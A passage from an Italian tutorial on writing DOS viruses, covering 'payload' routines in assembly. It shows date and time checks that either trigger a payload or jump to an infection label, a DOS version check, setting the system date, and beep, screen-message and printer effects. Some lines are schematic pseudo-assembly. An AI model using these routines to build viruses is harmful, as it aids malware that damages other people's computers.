<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>L’assemblatore compilerà il .COM calcolando tutti
gli indirizzi della variabili correttamente.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>2. Payload<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><u><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></u></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>Cosa fanno i virus oltre ad autoreplicarsi ? ecco
alcuni esempi di “payload”, routine che sono dedicate a rivelare la presenza
del virus.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><u><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>a) controlli di data<o:p></o:p></span></u></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>In molti casi il payload parte ad un certo punto nel
tempo. Questo payload è ottenuto con una &quot;date-checking-routine&quot; nel
codice:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>date_checking:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>mov ah,2ah<span
style="mso-spacerun: yes">                 </span>;legge la data<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99'>int 21h<span
style="mso-spacerun: yes">                    </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>cmp
cx,dh,dl,al<span style="mso-spacerun: yes">           
</span>;cx=anno(1980-2099),dh=mese,dl=giorno,al=giorno della <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun:
yes">                       </span><span style="mso-spacerun:
yes">       </span>;settimana. i numeri devono essere in esadecimale<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">  
</span>je/jne<span style="mso-spacerun: yes">                     </span>;jump
se uguale/no uguale</span></b><span style='font-size:12.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
color:#FFCC99'><span style="mso-spacerun: yes">                             
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>La funzione &quot;</span><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>mov ah,2ah</span></b><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>&quot; ritorna la data. output: <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">      
</span>CX<span style="mso-spacerun: yes">   </span>- ano (da 1980 a 2099)<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">      
</span>DH<span style="mso-spacerun: yes">   </span>- mese (1-12)<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">      
</span>DL<span style="mso-spacerun: yes">   </span>- giorno del mese (1-31)<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">      
</span>AL<span style="mso-spacerun: yes">   </span>- giorno della settimana
(1h=lunedi,2h=martedi,3h=mercoledi...)<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>Vengono confrontati i dati in output nei registri
con il valore &quot;payload-wanted&quot; richiesto. La data deve essere in
esadecimale<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>esempio di un payload che viene lanciato ogni
Venerdì 21: <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>mov
ah,2ah<span style="mso-spacerun: yes">                 </span>;leggo la data<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>int
21h<span style="mso-spacerun: yes">                    </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>cmp
al,005h<span style="mso-spacerun: yes">                </span>;è venerdi ?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>jne
infect<span style="mso-spacerun: yes">                 </span>;no, infetta<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>cmp
dh,15h<span style="mso-spacerun: yes">           </span><span
style="mso-spacerun: yes">      </span>;è il 21 ? (21 è 15 in hex)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>jne
infect<span style="mso-spacerun: yes">                 </span>;jump a infettare
se non è il 21<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>payload:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>....<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>infect:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>Con le ore, i minuti e i secondi…<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>mov
ah,2Ch<span style="mso-spacerun: yes">                 </span>;rileva l’ora<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>int
21h<span style="mso-spacerun: yes">                    </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>cmp al,cl,dh...<span
style="mso-spacerun: yes">            </span>;AL=ore,CL=minuti,DH=secondi,<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">  
</span>JE/JNE<span style="mso-spacerun: yes">                     </span>;poi
usa JMPs per attivare il payload<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>La varietà di JMP fornisce diverse possibilità. Ecco
i JMP più comuni:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">    </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>JNE<span style="mso-spacerun: yes">     </span>Jump if Not Equal <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span>JE<span style="mso-spacerun:
yes">      </span>Jump if Equal <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span>JMP<span style="mso-spacerun:
yes">     </span>Jump<span style="mso-spacerun: yes">   </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span>JA<span style="mso-spacerun:
yes">      </span>Jump if Above<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span>JB<span style="mso-spacerun:
yes">      </span>Jump if Below<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span>JAE<span style="mso-spacerun:
yes">     </span>Jump if Above or Equal<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span>JBE<span style="mso-spacerun:
yes">     </span>Jump if Below or Equal<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span>JNA<span style="mso-spacerun:
yes">     </span>Jump if Not Above <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span>JLE<span style="mso-spacerun:
yes">     </span>Jump if Less or Equal <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span>JL<span style="mso-spacerun:
yes">      </span>Jump if Less<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span>JZ<span style="mso-spacerun:
yes">      </span>Jump if Zero<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span>JNZ<span style="mso-spacerun:
yes">     </span>Jump if not Zero<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><u><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>b) Un’altra routine controlla la versione DOS:<o:p></o:p></span></u></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>mov
ax,3030h<span style="mso-spacerun: yes">              </span>;legge la versione
DOS<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>int
21h<span style="mso-spacerun: yes">                   </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>cmp al,
00h,01h,...<span style="mso-spacerun: yes">       </span>;la veriosne è
ritornata in AL<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>JE/JNE<span
style="mso-spacerun: yes">                    </span>;usa JMP's per attivare il
payload<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>versioni DOS :<span style="mso-spacerun: yes"> 
</span>00h = Versione 1, 01h = Versione 2, 02h = Versione 3 etc. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><u><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>c) Il settaggio di una nuova data usa la seguente
routine: <o:p></o:p></span></u></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>mov
ah,2bh<span style="mso-spacerun: yes">          </span>;setta la data di
distema<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>mov
cx,dh,dl,al<span style="mso-spacerun: yes">     </span>;metti qui la tua data
(vedi sopra per cx,dh....)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>int 21h<span style="mso-spacerun: yes">             </span>;</span></b><span
lang=EN-US style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><u><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'>d)
Il Beep del pc-speaker: <o:p></o:p></span></u></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>pc_speaker_beep_routine:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99'>mov cx, 50<span
style="mso-spacerun: yes">                 </span>;numero di beeps in CX<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>mov ax,
0e07h<span style="mso-spacerun: yes">              </span>;initializza lo
speaker...<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>int
10h<span style="mso-spacerun: yes">                    </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><u><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>e) Questa mostra un messaggio sullo schermo:<o:p></o:p></span></u></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>show_message_on_screen:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99'>mov ah,9h<span
style="mso-spacerun: yes">                  </span>;mostra testo<span
style="mso-spacerun: yes">     </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>lea dx,
message<span style="mso-spacerun: yes">            </span>;dx=messaggio (e.g
message db 'ciao',10,13,'$')<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>int
21h<span style="mso-spacerun: yes">                 </span></span></b><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99'><span style="mso-spacerun:
yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><u><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>f) E questa stampa un messaggio sulla stampante:<o:p></o:p></span></u></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>mov
ah,01h<span style="mso-spacerun: yes">         </span>;funzione printer<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>mov
dx,0h<span style="mso-spacerun: yes">          </span>;metto 0h in dx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>int
17h<span style="mso-spacerun: yes">            </span>;questo interrupt
initializza la stampante<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>lea si,text1<span
style="mso-spacerun: yes">       </span>;metto text1 in si<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>mov
cx,text1Len<span style="mso-spacerun: yes">    </span>;muovo text1len in cx<o:p></o:p></span></b></p>

